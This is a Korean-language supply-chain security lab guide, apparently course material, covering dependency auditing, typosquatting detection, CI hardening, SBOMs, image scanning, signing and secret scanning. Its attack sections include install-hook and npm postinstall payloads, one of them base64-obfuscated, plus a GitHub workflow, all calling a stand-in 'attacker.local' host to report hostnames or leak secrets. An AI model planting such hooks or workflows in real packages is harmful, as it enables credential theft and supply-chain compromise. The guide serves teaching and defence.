각 도구가 lab step 의 어디에 활용되는지 위 매핑표와 1:1 대응. s2 의 dependency confusion 은 verdaccio + devpi 가 사전 설치되어야 안전하게 실습 가능.

### 핵심 도구별 상세 사용법

#### 도구 1: pip-audit / safety / osv-scanner — 의존성 취약점 스캐너 (Step 1)

```bash
# pip-audit — Google 의 OSV 데이터베이스 사용
pip-audit -r requirements.txt
# 출력 예
# Found 3 known vulnerabilities in 2 packages
# Name      Version  ID                 Fix Versions
# requests  2.20.0   PYSEC-2018-28      2.20.0
# requests  2.20.0   GHSA-x84v-xcm2-53pg 2.31.0
# urllib3   1.24.1   PYSEC-2019-132     1.24.2

pip-audit --format json -o /tmp/audit.json
jq '.dependencies[] | select(.vulns | length > 0) | {name, vulns: .vulns[].id}' /tmp/audit.json

# safety — pyup.io 데이터베이스
safety check --file requirements.txt --json
safety check -r requirements.txt --output text --full-report

# osv-scanner — Google 의 정식 CLI
osv-scanner --recursive .
osv-scanner --lockfile=requirements.txt

# npm 생태계
npm audit
npm audit --json | jq '.metadata.vulnerabilities'
npm audit fix --force         # 자동 수정 (BREAKING 가능)

# yarn / pnpm
yarn audit --groups dependencies
pnpm audit

# Cargo (Rust)
cargo install cargo-audit
cargo audit

# Go
go list -m -u all
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...
```

직접 의존성 (top-level) 만 점검하면 안 됨 — 전이적 의존성 (transitive) 의 CVE 가 더 흔하다. `pipdeptree` 로 트리 구조 시각화:

```bash
pipdeptree -p requests
# requests==2.31.0
# ├── certifi [required: >=2017.4.17, installed: 2023.7.22]
# ├── charset-normalizer [required: >=2,<4, installed: 3.3.0]
# ├── idna [required: >=2.5,<4, installed: 3.4]
# └── urllib3 [required: >=1.21.1,<3, installed: 2.0.7]
```

#### 도구 2: verdaccio + setup.py — Dependency Confusion PoC (Step 2)

```bash
# === 격리 환경 PoC — 절대 공개 PyPI/npm 에서 시도 금지 ===

# 1) 사설 레지스트리에 "내부" 패키지 mycompany-utils v1.0 등록
mkdir /tmp/internal-pkg && cd /tmp/internal-pkg
cat > setup.py << 'PY'
from setuptools import setup
setup(name="mycompany-utils", version="1.0", description="internal")
PY
python setup.py sdist
devpi upload dist/*

# 2) 공격자가 동일 이름 v99.0 을 더 높은 버전으로 등록 (별도 디렉터리)
mkdir /tmp/evil-pkg && cd /tmp/evil-pkg
cat > setup.py << 'PY'
from setuptools import setup, Command
from setuptools.command.install import install
import os, socket

class PostInstall(install):
    def run(self):
        host = socket.gethostname()
        # 격리 환경에서는 callback 만 — 실제 reverse shell 금지
        os.system(f"curl -s 'http://attacker.local/cb?h={host}&pkg=mycompany-utils' > /tmp/exfil.log 2>&1 || true")
        install.run(self)

setup(name="mycompany-utils", version="99.0",
      description="malicious",
      cmdclass={'install': PostInstall})
PY
python setup.py sdist
twine upload --repository-url http://localhost:3141/demo/dev/ dist/*

# 3) 빌드 시스템 (--extra-index-url 사용 시) — 공격 성공
pip install --extra-index-url http://localhost:3141/demo/dev/ mycompany-utils
# Resolved: mycompany-utils 99.0 (★ 공개 v99 가 우선)
# /tmp/exfil.log 에 callback 흔적 남음

# 4) 방어 (--index-url 단일 사용) — 공격 실패
pip install --index-url http://internal.devpi.local/ mycompany-utils
# Resolved: mycompany-utils 1.0 (★ 안전)

# === npm 동일 시나리오 ===
mkdir /tmp/internal-npm && cd /tmp/internal-npm
cat > package.json << 'JSON'
{"name":"mycompany-utils","version":"1.0.0","main":"index.js"}
JSON
echo 'console.log("internal");' > index.js
npm publish --registry http://localhost:4873

mkdir /tmp/evil-npm && cd /tmp/evil-npm
cat > package.json << 'JSON'
{
  "name":"mycompany-utils",
  "version":"99.0.0",
  "main":"index.js",
  "scripts": {"postinstall":"node -e \"require('http').get('http://attacker.local/cb?pkg=' + process.env.npm_package_name)\""}
}
JSON
echo 'console.log("evil");' > index.js
npm publish --registry http://public-mirror.local

# 방어 — scope 사용
# package.json 에 "name": "@mycompany/utils" 로 변경하면
# npm 은 @mycompany 만 사설 registry, 다른 것은 공개로 자동 분리
```

탐지 (Blue): `npm config get registry` + `pip config list` 으로 모든 빌드머신의 settings 검사. CI 에는 `verdaccio --config strict.yaml` 의 `proxy: false` 모드로 강제.

#### 도구 3: confused / typoguard — Typosquatting 탐지 (Step 3)

```bash
# confused — Visma Prosec 의 namespace 검사 도구
confused -l pip requirements.txt
# Issues found, the following packages are not available in public package repositories:
# [!] mycompany-internal
# [!] mycompany-utils

confused -l npm package.json

# 패키지 이름 유사도 — Levenshtein distance + Damerau (글자 swap)
python3 << 'PY'
import Levenshtein
popular = ["requests","urllib3","numpy","pandas","tensorflow","django","flask","matplotlib"]
target  = "reqeusts"      # typo
for p in popular:
    d = Levenshtein.distance(p, target)
    if d <= 2:
        print(f"[!] {target} too similar to {p} (distance {d})")
PY

# npq — npm install 전 평가
npq install lodash
# ✓ lodash@4.17.21
#   ✓ Maintainer activity: high
#   ✓ Downloads: 50M/week
#   ✓ Created: 2012 (mature)
#   ✓ No similar suspicious packages

# 패키지 메타데이터 직접 검사
curl -s https://pypi.org/pypi/requests/json | jq '{name, info: {author, home_page, project_urls}, urls: [.urls[].upload_time]}'
curl -s https://registry.npmjs.org/lodash | jq '{name, time: .time.created, maintainers: .maintainers}'

# 인기 패키지 유사 이름 후보 — 공격자 시점
python3 << 'PY'
target = "requests"
# typo, dash 제거, hyphen → underscore, 단수/복수
candidates = [target+"s", target.replace("e","3"), "request", "requets", "reqests", "requestt"]
for c in candidates:
    print(f"https://pypi.org/project/{c}/")
PY
```

탐지 (Blue): 모든 `requirements.txt` / `package.json` 을 CI 에서 `confused` 로 검사 + 신규 의존성 추가 시 `npq install` 강제. 인기 패키지의 알려진 typo 명단 (예: pip 의 `pypa/advisory-database`) 을 deny-list 로 등록.

#### 도구 4: actionlint / pinact / harden-runner — GitHub Actions 보안 (Step 4)

```bash
# actionlint — workflow YAML 검증
cd /path/to/repo
actionlint
# .github/workflows/release.yml:5:9: shell name "${{ inputs.shell }}" is not valid [shell-name]
# .github/workflows/release.yml:18:9: "actions/checkout@v3" should be pinned to commit SHA [pinned-versions]

# pinact — 모든 action 을 SHA 로 pin 자동 변환
pinact run .github/workflows/*.yml
# Before: uses: actions/checkout@v4
# After:  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

# harden-runner — runtime egress 차단
cat > .github/workflows/secure.yml << 'YML'
name: Secure CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read    # ★ 최소 권한
    steps:
      - uses: step-security/harden-runner@cba0d00b1fc9a034e1e642ea0f1103c282990604 # v2.5.0
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
      - run: make test
YML

# OIDC — secret 없는 cloud auth (AWS/GCP/Azure)
cat > .github/workflows/oidc.yml << 'YML'
permissions:
  id-token: write   # OIDC token 발급
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
      aws-region: us-east-1
  - run: aws s3 ls
YML

# Branch protection rules (gh CLI)
gh api repos/:owner/:repo/branches/main/protection -X PUT -f required_status_checks[strict]=true \
  -f required_pull_request_reviews[required_approving_review_count]=2 \
  -f enforce_admins=true \
  -f restrictions=null

# pull request reviewer requirements + signed commits
gh api repos/:owner/:repo/branches/main/protection/required_signatures -X POST
```

CI/CD 의 핵심 통제: **3 레이어**.
1. **Workflow 자체** — actionlint / pinact / minimum permissions
2. **Runner** — harden-runner egress block + ephemeral runner
3. **Branch** — required reviews / signed commits / status checks

#### 도구 5: syft / cyclonedx — SBOM 생성·분석 (Step 9)

```bash
# syft — Anchore SBOM 생성기 (CycloneDX/SPDX/Syft 형식)
syft packages dir:. -o cyclonedx-json > /tmp/sbom.cdx.json
syft packages dir:. -o spdx-json > /tmp/sbom.spdx.json
syft packages registry:nginx:latest -o cyclonedx-json > /tmp/nginx-sbom.json

# 빠른 inventory
syft packages dir:.
# NAME           VERSION  TYPE
# requests       2.31.0   python
# urllib3        2.0.7    python
# certifi        2023.7.22 python
# (...)

# cyclonedx-cli — SBOM 분석·diff·merge
cyclonedx-bom -i requirements.txt -o /tmp/python-sbom.xml
cyclonedx-bom diff old-sbom.json new-sbom.json
# 출력: 추가/제거/변경된 component 비교

# Dependency-Track 에 SBOM 업로드 (dashboard)
curl -X POST -H "X-Api-Key: $DT_KEY" \
  -F "project=00000000-0000-0000-0000-000000000000" \
  -F "bom=@/tmp/sbom.cdx.json" \
  http://localhost:8080/api/v1/bom

# OSV-Scanner 로 SBOM 직접 검사
osv-scanner --sbom=/tmp/sbom.cdx.json

# SPDX 형식 변환 (regulator/legal 우호적)
spdx-tools convert -i /tmp/sbom.spdx.json -o /tmp/sbom.xlsx -f xlsx

# SBOM 비교 — release 간 차이 자동
diff <(jq '.components[] | "\(.name)@\(.version)"' v1.0-sbom.json | sort) \
     <(jq '.components[] | "\(.name)@\(.version)"' v1.1-sbom.json | sort)
```

NIST 의 **Minimum Elements for SBOM** (EO 14028):
- Author / Supplier / Component name / Version / Unique identifier (PURL/CPE) / Dependency relationships / Author of SBOM data / Timestamp

`syft` 의 출력은 위 7요소를 모두 충족. CI 에 `syft + osv-scanner + cyclonedx diff` 3 단계로 자동화.

#### 도구 6: trivy / grype / dive — 컨테이너 이미지 분석 (Step 8)

```bash
# Trivy — Aqua Security 의 종합 스캐너
trivy image nginx:latest
# nginx:latest (debian 12.5)
# ============================
# Total: 64 (UNKNOWN: 0, LOW: 38, MEDIUM: 19, HIGH: 6, CRITICAL: 1)
# 
# ┌─────────────┬──────────────┬──────────┬─────────────┬───────────────┐
# │ Library     │ Vulnerability│ Severity │ Installed   │ Fixed Version │
# ├─────────────┼──────────────┼──────────┼─────────────┼───────────────┤
# │ libssl3     │ CVE-2024-2511│ MEDIUM   │ 3.0.11-1~deb12u1 │ 3.0.13-1~deb12u1 │
# (...)

trivy image --severity HIGH,CRITICAL --exit-code 1 nginx:latest
trivy image --format sarif -o trivy.sarif nginx:latest    # GitHub Code Scanning 호환

# 비밀 스캔 + IaC 동시
trivy fs --scanners vuln,secret,config /path/to/repo

# Grype — Anchore 의 취약점 스캐너 (syft 와 짝)
syft packages nginx:latest -o json | grype
# 또는 직접
grype nginx:latest
grype dir:.

# dive — 레이어별 파일 변경 분석 (악성 레이어 탐지)
dive nginx:latest
# 좌측: 레이어별 명령 (ADD/COPY/RUN)
# 우측: 추가/수정/삭제된 파일
# Image 효율성: 87% (불필요한 파일 13%)

# 의심 시그니처 — 레이어 안에 SUID, /tmp 의 binary, ssh key
docker save nginx:latest | tar -xO --wildcards '*/layer.tar' | tar -t | grep -E "(\.ssh|setuid|/tmp/)"

# Distroless / multi-stage 권장
cat > Dockerfile << 'DK'
FROM golang:1.21 AS build
WORKDIR /src
COPY . .
RUN CGO_ENABLED=0 go build -o /app

FROM gcr.io/distroless/static:nonroot
COPY --from=build /app /app
USER nonroot
ENTRYPOINT ["/app"]
DK

# 이미지 서명 (cosign)
cosign generate-key-pair
cosign sign --key cosign.key myregistry.io/nginx:latest
cosign verify --key cosign.pub myregistry.io/nginx:latest
# Verification for myregistry.io/nginx:latest --
# The following checks were performed on each of these signatures:
#   - The cosign claims were validated
#   - The signatures were verified against the specified public key
```

distroless + multi-stage + cosign 서명 3 단계는 컨테이너 공급망의 *기본*. golden image 정책은 이 위에 reproducible build (Bazel/Nix) 을 더한다.

#### 도구 7: gpg / cosign / sigstore — 코드·아티팩트 서명 (Step 7)

```bash
# === 전통적 GPG ===
gpg --gen-key
gpg --list-secret-keys
# sec  rsa3072 2026-05-02 [SC]
#       ABCDEF1234567890ABCDEF1234567890ABCDEF12

KEY_ID=ABCDEF1234567890ABCDEF1234567890ABCDEF12

# 파일 서명
echo "release-1.0" > release.txt
gpg --detach-sign -a -u $KEY_ID release.txt
ls
# release.txt  release.txt.asc

# 공개키 export + 검증
gpg --export -a $KEY_ID > public.key
gpg --import public.key
gpg --verify release.txt.asc release.txt
# gpg: Good signature from "Student <student@corp.example>"

# git commit 서명
git config user.signingkey $KEY_ID
git config commit.gpgsign true
git commit -S -m "signed commit"
git log --show-signature -1

# === Sigstore cosign — keyless OIDC 서명 ===
# 키 생성 없이 GitHub OIDC 로 서명 (CI 에서 사용)
cosign sign --yes ghcr.io/myorg/myapp:1.0
# 브라우저 OIDC flow → Fulcio 가 임시 인증서 발급 → Rekor 에 서명 기록

cosign verify ghcr.io/myorg/myapp:1.0 \
  --certificate-identity=https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com

# 키 기반 (offline)
cosign generate-key-pair
cosign sign --key cosign.key ghcr.io/myorg/myapp:1.0
cosign verify --key cosign.pub ghcr.io/myorg/myapp:1.0

# Rekor transparency log 검색
rekor-cli search --artifact /tmp/release.txt
rekor-cli get --uuid abc123...

# === sigstore-python — PyPI 서명 ===
sigstore sign release-1.0.tar.gz
# Generates release-1.0.tar.gz.sigstore
sigstore verify identity \
  --cert-identity user@example.com \
  --cert-oidc-issuer https://accounts.google.com \
  release-1.0.tar.gz

# === SLSA Verifier (provenance + 서명 동시 검증) ===
slsa-verifier verify-artifact ghcr.io/myorg/myapp:1.0 \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/myorg/myapp \
  --source-tag v1.0
```

GPG 의 한계: 키 분배·revocation 어려움. 현대 권장은 **Sigstore (cosign + Rekor + Fulcio)** — 키 없이 OIDC 로 서명 + 모든 서명이 공개 transparency log 에 기록되어 탈취/위조 불가.

#### 도구 8: gitleaks / trufflehog — Git 시크릿 스캔 (Step 11)

```bash
# gitleaks — 가장 빠르고 정확
cd /path/to/repo
gitleaks detect --verbose
# Finding: AWS Access Key
# Secret: AKIAIOSFODNN7EXAMPLE
# RuleID: aws-access-token
# File: .env.local
# Commit: abc123

gitleaks detect --report-format json --report-path /tmp/leaks.json
gitleaks protect --staged                  # pre-commit hook 용

# 사용자 정의 룰
cat > .gitleaks.toml << 'TOML'
[[rules]]
id = "internal-api"
description = "Internal API key"
regex = '''ic_[a-z0-9]{32}'''
keywords = ["ic_"]
TOML
gitleaks detect --config .gitleaks.toml

# trufflehog — 검증 (실제 작동하는 키만 필터)
trufflehog git file:///path/to/repo --only-verified
# AWS access key found and verified (returns 200 from STS)

trufflehog github --org=myorg --token=$GH_TOKEN --only-verified

# 과거 커밋까지 검사 (필수)
git log --all --full-history --source -p > /tmp/all-commits.txt
gitleaks detect --source /tmp/all-commits.txt

# 누출된 시크릿 즉시 행동
# 1) 즉시 revoke (AWS console / GitHub PAT 등)
# 2) git filter-repo 로 git history 에서 제거 (BFG Repo-Cleaner 도 가능)
git filter-repo --invert-paths --path .env.local
git filter-repo --replace-text replacements.txt   # 패턴 치환

# 3) Force push (모든 fork 와 PR 에 알림 필요)
git push --force --all

# pre-commit hook (필수)
pip install pre-commit
cat > .pre-commit-config.yaml << 'YML'
repos:
- repo: https://github.com/gitleaks/gitleaks
  rev: v8.18.0
  hooks:
    - id: gitleaks
- repo: https://github.com/trufflesecurity/trufflehog
  rev: v3.63.0
  hooks:
    - id: trufflehog
      args: ['git', 'file://.', '--only-verified']
YML
pre-commit install
```

핵심 — git history 의 시크릿은 *commit 이 살아있는 한 영원히 노출* 된다. 발견 즉시 (a) revoke (b) history rewrite (c) force push 3 단계를 한 시간 내 완료해야 한다.

#### 도구 9: in-toto / SLSA Verifier — 빌드 무결성 (Step 14)

```bash
# in-toto — 빌드 단계별 attestation
# Layout 정의 (어떤 functionary 가 어떤 step 을 수행하는지)
in-toto-keygen alice
in-toto-keygen bob

cat > root.layout << 'LAYOUT'
{
  "signed": {
    "_type": "layout",
    "expires": "2027-01-01T00:00:00Z",
    "keys": {"alice": {...}, "bob": {...}},
    "steps": [
      {"_name": "fetch", "expected_command": ["git", "clone"], "pubkeys": ["alice"], ...},
      {"_name": "build", "expected_command": ["make"], "pubkeys": ["bob"], ...}
    ],
    "inspect": [...]
  }
}
LAYOUT

in-toto-sign root.layout -k alice
in-toto-run --step-name fetch --key alice -- git clone https://github.com/myorg/repo
in-toto-run --step-name build --key bob -- make

in-toto-verify --layout root.layout --layout-keys alice.pub
# Verification passed: all steps' attestations verified

# === SLSA — Supply chain Levels for Software Artifacts ===
# Level 1: 빌드 스크립트 + provenance 메타데이터
# Level 2: 호스팅된 빌드 시스템 + 서명된 provenance
# Level 3: 격리된 빌드 + non-falsifiable provenance
# Level 4: 2명 review + reproducible build + hermetic

# GitHub Actions 의 SLSA Level 3 generator
cat > .github/workflows/release.yml << 'YML'
on: { push: { tags: ["v*"] } }
permissions: { contents: write, id-token: write, actions: read }
jobs:
  build:
    runs-on: ubuntu-latest
    outputs: { hashes: ${{ steps.hash.outputs.hashes }} }
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: make release
      - id: hash
        run: echo "hashes=$(sha256sum dist/* | base64 -w0)" >> $GITHUB_OUTPUT
  provenance:
    needs: build
    permissions: { id-token: write, contents: write, actions: read }
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
    with: { base64-subjects: ${{ needs.build.outputs.hashes }} }
YML

# 소비자 검증
slsa-verifier verify-artifact dist/myapp-1.0.tar.gz \
  --provenance-path myapp-1.0.intoto.jsonl \
  --source-uri github.com/myorg/myapp \
  --source-tag v1.0

# === OpenSSF Scorecard — 자동 평가 ===
scorecard --repo=github.com/myorg/myapp
# Score: 6.7/10
# - Maintained:        10/10
# - Code-Review:        7/10  (recommend signed commits)
# - Branch-Protection:  3/10  (★ require status checks)
# - Pinned-Dependencies: 2/10 (★ pin actions)
# - SAST:               5/10
# - Token-Permissions:  9/10
```

SLSA Level 평가표:

| Level | 빌드 | provenance | 격리 | 인력 |
|-------|------|------------|------|------|
| 1 | 스크립트 존재 | 메타데이터 | - | - |
| 2 | 호스팅 빌드 | 서명됨 | - | - |
| 3 | 호스팅 빌드 | non-falsifiable | hermetic | - |
| 4 | 위 + reproducible | 위 | parameterless | 2-person review |

학생 프로젝트는 보통 Level 1 → Level 2 (GH Actions 사용) → Level 3 (slsa-github-generator 도입) 으로 단계적 승격.

### 점검 / 공격 / 방어 흐름 (15 step + multi_task 통합)

#### Phase A — 의존성·서명 인벤토리 (정찰, s1·s9·s11)

```bash
# 1. Python 의존성 풀 inventory
pip list --format json > /tmp/deps-py.json
pipdeptree --json > /tmp/deps-py-tree.json
pip-audit --format json > /tmp/audit-py.json

# 2. Node.js 동일
npm list --json --all > /tmp/deps-node.json
npm audit --json > /tmp/audit-node.json

# 3. 컨테이너 이미지 SBOM
syft packages dir:. -o cyclonedx-json > /tmp/sbom.json
osv-scanner --sbom=/tmp/sbom.json --format json > /tmp/sbom-vulns.json

# 4. Git 시크릿 baseline
gitleaks detect --report-format json --report-path /tmp/leaks-baseline.json

# 5. CI/CD lint
actionlint -format '{{json .}}' > /tmp/actionlint.json

# 6. SLSA / Scorecard
scorecard --repo=github.com/myorg/myapp --format json > /tmp/scorecard.json

# 종합 dashboard
cat > /tmp/supply-chain-baseline.txt << EOF
=== Supply Chain Baseline ($(date +%F)) ===
Python deps: $(jq '. | length' /tmp/deps-py.json)
Node deps:   $(jq '.dependencies | length' /tmp/deps-node.json)
Vulnerabilities (py):    $(jq '[.dependencies[] | select(.vulns | length > 0)] | length' /tmp/audit-py.json)
Vulnerabilities (node):  $(jq '.metadata.vulnerabilities.total' /tmp/audit-node.json)
SBOM components:         $(jq '.components | length' /tmp/sbom.json)
Git secrets found:       $(jq '. | length' /tmp/leaks-baseline.json)
CI lint findings:        $(jq '. | length' /tmp/actionlint.json)
OpenSSF Scorecard:       $(jq '.score' /tmp/scorecard.json)
EOF
cat /tmp/supply-chain-baseline.txt
```

#### Phase B — 공격자 침해 시도 (s2·s3·s4·s5·s10)

```bash
# 1. Dependency Confusion (격리 mirror 에서만!)
cd /tmp/evil-pkg && python setup.py sdist
twine upload --repository-url http://localhost:3141/demo/dev/ dist/*

# 2. Typosquatting 등록
cd /tmp/typo-pkg && cat > setup.py << 'PY'
setup(name="reqeusts", version="1.0", description="typo of requests")
PY
twine upload --repository-url http://localhost:3141/demo/dev/ dist/*

# 3. Post-install Hook 페이로드
cat > setup.py << 'PY'
from setuptools.command.install import install
class Bad(install):
    def run(self):
        import os, base64
        cmd = base64.b64decode("Y3VybCBhdHRhY2tlci5sb2NhbA==").decode()
        os.system(cmd + " > /tmp/exfil.log")
        install.run(self)
setup(name="evil-pkg", version="1.0", cmdclass={'install': Bad})
PY

# 4. CI/CD 공격 — fork → PR 으로 secret 추출
# (격리 환경 시뮬: workflow 의 ${{ secrets.X }} 가 echo 되도록)
cat > .github/workflows/leak.yml << 'YML'
on: pull_request
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "::add-mask::${{ secrets.AWS_KEY }}"
          curl -d "${{ secrets.AWS_KEY }}" http://attacker.local
YML
# 방어: pull_request_target 사용 시 fork PR 차단 + required reviewers

# 5. Git 시크릿 leak 시뮬
git checkout -b feature
echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" > .env.local
git add . && git commit -m "feat"   # gitleaks pre-commit 가 차단해야 정상
```

#### Phase C — 방어자 통제 (s7·s8·s11·s13·s14)

```bash
# 1. 모든 의존성 fixed version pin
pip freeze > requirements.lock
pip install -r requirements.lock --no-deps    # transitives 도 명시

# 2. SBOM 생성 + Dependency-Track 업로드
syft packages dir:. -o cyclonedx-json > /tmp/sbom.json
curl -X POST -H "X-Api-Key: $DT_KEY" \
  -F "bom=@/tmp/sbom.json" \
  http://localhost:8080/api/v1/bom

# 3. cosign 서명 + verify (CI 마지막 단계)
cosign sign --yes ghcr.io/myorg/myapp:$GITHUB_SHA
cosign verify ghcr.io/myorg/myapp:$GITHUB_SHA \
  --certificate-identity-regexp="^https://github.com/myorg/" \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com"

# 4. SLSA L3 provenance
# slsa-github-generator workflow 가 자동으로 생성

# 5. branch protection + required signed commits
gh api repos/:owner/:repo/branches/main/protection -X PUT \
  -f required_pull_request_reviews[required_approving_review_count]=2 \
  -f required_signatures=true

# 6. pre-commit hooks (모든 commit 차단)
pre-commit install
pre-commit run --all-files

# 7. Dependabot auto-merge (small bump)
cat > .github/dependabot.yml << 'YML'
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule: { interval: "daily" }
    groups:
      patches: { update-types: ["patch"] }
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
YML

# 8. 모니터링 alert
# Dependency-Track webhook → Slack
# Sigstore Rekor watcher → 새 서명 알림
# OpenSSF Scorecard 매주 → 점수 하락 시 PR 생성
```

#### Phase D — 통합 시나리오 (s99 multi_task)

s1 → s2 → s3 → s4 → s5 를 Bastion 에이전트가 한 번에 처리:

1. **plan** — "5 단계: 의존성 audit → confusion 시뮬 → typo 검색 → action lint → setup.py 분석"
2. **execute** — `pip-audit` 실행 + `confused -l pip requirements.txt` + `actionlint` 실행 + 의심 setup.py 패턴 탐지
3. **synthesize** — T1195.001/.002 ATT&CK 매핑 + 각 단계 통제 (pin / scope / lint / `--ignore-scripts` / SBOM)

학생은 multi_task 의 `bastion_prompt` 를 던지고 5 작업의 success_criteria 를 한 번에 검증.

### 도구 비교표 — 공급망 공격 vs 통제

| 카테고리 | Red 기법 | Red 한계 | Blue 도구 | Blue 우위 조건 |
|---------|---------|----------|-----------|----------------|
| **Dependency Confusion** | 동일 이름 + 높은 버전 공개 | --index-url 단일 사용 시 무력 | scope namespace + Artifactory | 공개/사설 격리 |
| **Typosquatting** | 유사 이름 (1-2 char distance) | npq / confused 자동 탐지 | confused, npq, dependency-track | install 전 review |
| **Post-install Hook** | setup.py cmdclass / package.json scripts | --ignore-scripts | npm install --ignore-scripts | install 차단 + audit |
| **CI/CD 침해** | fork PR / workflow leak / OIDC 우회 | required reviewers + harden-runner | actionlint, pinact, harden-runner | 3 레이어 통제 |
| **빌드 시스템** | SolarWinds 식 SUNBURST | reproducible build, in-toto | Bazel/Nix + in-toto + SLSA | hermetic build |
| **코드 서명 우회** | 탈취된 signing key | Sigstore (key-less) + transparency log | cosign + Rekor + Fulcio | OIDC + 공개 log |
| **컨테이너 이미지** | 악성 base image, 레이어 주입 | trivy + dive + signed image | trivy/grype/dive + cosign | distroless + multi-stage |
| **SBOM 누락** | undocumented deps | osv-scanner / dependency-track alert | syft + cyclonedx + DT | 빌드별 SBOM diff |
| **Git 시크릿** | `.env.local`, AWS key | gitleaks pre-commit + revoke | gitleaks, trufflehog | history scan + force push |
| **하드웨어** | UEFI/BMC firmware 변조 | TPM measured boot + Secure Boot | chipsec, TPM PCR, Secure Boot | 부팅 체인 검증 |

### 도구 선택 매트릭스 — 시나리오별 권장

| 시나리오 | 우선 도구 | 이유 |
|---------|---------|------|
| "신규 프로젝트 — 보안 첫 설계" | scope namespace + cosign + SLSA L2 generator | 처음부터 격리 + 서명 + provenance |
| "레거시 프로젝트 — 첫 audit" | pip-audit + npm audit + gitleaks + scorecard | 현 상태 baseline 즉시 확보 |
| "내부 패키지 다수" | Artifactory/Nexus + scope + --index-url 강제 | Dependency Confusion 차단 |
| "OSS 의존 다수" | Dependabot daily + Renovate group + osv-scanner CI | 자동 PR + 즉시 알림 |
| "고민감 (금융/의료)" | SLSA L3 + reproducible + 2-person + air-gapped CI | non-falsifiable provenance |
| "incident 중 (공급망 침해 의심)" | trivy fs + gitleaks --all + osv-scanner + Rekor 검색 | 즉시 모든 surface 스캔 |
| "regulator 보고용" | SPDX SBOM + cyclonedx + dependency-track 보고서 | EO 14028 / NIST SBOM 양식 |

### 공급망 보안 로드맵 (s15 산출물)

학생이 s15 에서 `/tmp/supply_chain_roadmap.txt` 에 작성하는 30+ 항목을 SLSA/NIST 매핑과 함께:

| 카테고리 | 항목 | 도구 / 기준 | SLSA/NIST |
|---------|------|------------|-----------|
| Dependencies | 모든 직접/전이 의존성 fixed version | requirements.lock + package-lock.json | NIST SSDF PS.1 |
| Dependencies | 일일 자동 audit | Dependabot + osv-scanner CI | NIST SSDF PW.4 |
| Dependencies | 신규 dep PR 시 review | npq + confused 강제 | NIST SSDF PS.2 |
| Build | 호스팅된 빌드 (격리) | GitHub Actions + harden-runner | SLSA L2 |
| Build | provenance 생성 + 서명 | slsa-github-generator | SLSA L3 |
| Build | reproducible build | Bazel / Nix | SLSA L4 |
| SBOM | 모든 release 별 SBOM | syft + cyclonedx-bom | NIST SSDF PS.3 |
| SBOM | SBOM diff 자동 알림 | dependency-track + Slack | NIST SSDF RV.1 |
| Signing | 모든 artifact cosign 서명 | cosign + Rekor | SLSA L2+ |
| Signing | git commit GPG/Sigstore 서명 | git config + Sigstore | NIST SSDF PS.2 |
| Secrets | pre-commit gitleaks | pre-commit hook | NIST SSDF PS.2 |
| Secrets | secret scanning (GitHub) | Native + 사용자 룰 | NIST SSDF RV.1 |
| Container | distroless + multi-stage | Dockerfile 정책 | NIST SSDF PW.5 |
| Container | trivy/grype CI 차단 | severity HIGH 차단 | NIST SSDF PW.4 |
| Container | 이미지 cosign 서명 | cosign + verify | SLSA L2+ |
| Monitoring | OpenSSF Scorecard | scorecard 주간 실행 | NIST SSDF Annex A |
| Response | revoke playbook | secret 발견 → 1h 내 revoke | NIST SP 800-61 |

### 학생 셀프 체크리스트 (각 step 완료 기준)

- [ ] s1: `pip list` + `pip-audit` (또는 `safety`) 실행, 직접·전이 dep 구분 언급
- [ ] s2: setup.py post_install 예시 + `--index-url` 단일 사용 + scope @org/pkg 방어 3가지
- [ ] s3: typo 패턴 (글자 swap/단수형) 예시 + Levenshtein distance 또는 confused 도구 사용
- [ ] s4: GitHub Actions YAML 예시 + actionlint 적용 + harden-runner egress block 명시
- [ ] s5: setup.py cmdclass 또는 npm postinstall 예시 + `--ignore-scripts` 방어
- [ ] s6: SUNBURST 4 단계 (빌드 침투 → 백도어 → 서명 → 배포) 설명 + 18,000+ 영향 언급
- [ ] s7: GPG sign + cosign keyless OIDC + Rekor transparency log 3가지
- [ ] s8: trivy + dive + distroless + multi-stage + cosign 서명 5가지
- [ ] s9: syft 또는 cyclonedx 로 SBOM 생성, 7요소 (NIST minimum) 충족
- [ ] s10: pre/post install 스크립트 검사 + `npm install --ignore-scripts` + npq
- [ ] s11: gitleaks/trufflehog detect + revoke playbook + history rewrite (filter-repo)
- [ ] s12: 펌웨어 변조 위험 + chipsec / TPM measured boot 방어
- [ ] s13: dependency-track / scorecard / OSV 모니터링 3가지 이상
- [ ] s14: SLSA L1~L4 단계 설명 + 현 프로젝트 Level 진단 + 다음 단계 plan
- [ ] s15: `/tmp/supply_chain_roadmap.txt` 5 카테고리 × 4+ 항목 + NIST SSDF/SLSA 매핑
- [ ] s99: Bastion 가 5 작업을 plan→execute→synthesize, 5 ATT&CK ID + 단계별 통제

### 추가 참조 자료

- **Executive Order 14028** Improving the Nation's Cybersecurity (2021)
- **NIST SP 800-218** Secure Software Development Framework (SSDF)
- **NIST SP 800-161 r1** Cybersecurity Supply Chain Risk Management Practices
- **SLSA Specification** https://slsa.dev/spec/v1.0/
- **NIST SBOM Minimum Elements** https://www.ntia.gov/SBOM
- **Sigstore Documentation** https://docs.sigstore.dev/
- **OpenSSF Scorecard** https://github.com/ossf/scorecard
- **MITRE ATT&CK T1195** (Supply Chain Compromise) 전체 sub-techniques
- **CNCF SLSA + in-toto + Tekton Chains** integration guide
